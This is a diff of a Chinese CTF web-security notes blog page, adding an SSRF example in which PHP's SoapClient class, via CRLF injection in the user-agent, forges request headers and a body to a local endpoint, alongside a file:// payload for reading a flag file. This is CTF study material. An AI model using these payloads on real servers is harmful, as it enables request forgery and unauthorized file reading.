@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975192117.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975369757.png!small">
 <meta property="article:published_time" content="2023-08-03T14:51:23.000Z">
-<meta property="article:modified_time" content="2023-08-07T09:40:55.612Z">
+<meta property="article:modified_time" content="2023-08-09T13:51:25.131Z">
 <meta property="article:author" content="Lunatic">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web">
@@ -165,7 +165,10 @@
 <h2 id="常见的响应代码"><a href="#常见的响应代码" class="headerlink" title="常见的响应代码"></a>常见的响应代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">200 OK：表示成功；</span><br><span class="line">301 Moved Permanently：表示该URL已经永久重定向；</span><br><span class="line">302 Found：表示该URL需要临时重定向；</span><br><span class="line">304 Not Modified：表示该资源没有修改，客户端可以使用本地缓存的版本；</span><br><span class="line">400 Bad Request：表示客户端发送了一个错误的请求，例如参数无效；</span><br><span class="line">401 Unauthorized：表示客户端因为身份未验证而不允许访问该URL；</span><br><span class="line">403 Forbidden：表示服务器因为权限问题拒绝了客户端的请求；</span><br><span class="line">404 Not Found：表示客户端请求了一个不存在的资源；</span><br><span class="line">500 Internal Server Error：表示服务器处理时内部出错，例如因为无法连接数据库；</span><br><span class="line">503 Service Unavailable：表示服务器此刻暂时无法处理请求。</span><br></pre></td></tr></table></figure>
 
 <h2 id="网站禁用了F12，Ctrl-u，鼠标右键的解决方案"><a href="#网站禁用了F12，Ctrl-u，鼠标右键的解决方案" class="headerlink" title="网站禁用了F12，Ctrl+u，鼠标右键的解决方案"></a>网站禁用了F12，Ctrl+u，鼠标右键的解决方案</h2><p>可以先点击地址栏，再按F12，或者从浏览器设置里打开。</p>
-<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><p>伪协议读取文件<br>1.网站的目录一般都在/var/www/html/，我们由此构造payload：</p>
+<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><p>例子——利用PHP中的 SoapClient 原生类伪造请求头</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:7788/soapSSRFtest.php&#x27;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:7788&#x27;</span>, <span class="string">&quot;user_agent&quot;</span> =&gt; <span class="string">&quot;xxxxx\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie:PHPSESSID=aaaaa\r\nContent-Length:9\r\n\r\neval=calc&quot;</span>));</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>伪协议读取文件<br>1.网站的目录一般都在/var/www/html/，我们由此构造payload：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
 
 <h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><p>详细内容可以参考博客中的 <strong>PHP Basic and Vulnerability</strong> 这篇文章</p>
@@ -483,11 +486,10 @@
 
 <h2 id="获取本机-LInux-网卡的mac地址"><a href="#获取本机-LInux-网卡的mac地址" class="headerlink" title="获取本机(LInux)网卡的mac地址"></a>获取本机(LInux)网卡的mac地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux系统的网卡地址保存在：</span><br><span class="line">/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>
 
-
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/08/03/CTF%E2%80%94%E2%80%94Web%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" data-id="cll38ueca000ql03z9i1f4ick" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/08/03/CTF%E2%80%94%E2%80%94Web%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" data-id="cll4i2o9s000kyc3z7g16cje5" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
@@ -498,11 +500,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2023/08/06/Injection%20Attack/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2023/08/07/Python%20Learning%20Record/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          Injection Attack
+          Python Learning Record
         
       </div>
     </a>
@@ -558,15 +560,15 @@
       <ul>
         
           <li>
-            <a href="/2023/08/09/PHP%20Basic%20and%20Vulnerability/">PHP Basic and Vulnerability</a>
+            <a href="/2023/08/10/Injection%20Attack/">Injection Attack</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/PHP%20Basic%20and%20Vulnerability/">PHP Basic and Vulnerability</a>
           </li>
         
           <li>
             <a href="/2023/08/07/Python%20Learning%20Record/">Python Learning Record</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/06/Injection%20Attack/">Injection Attack</a>
           </li>
         
           <li>
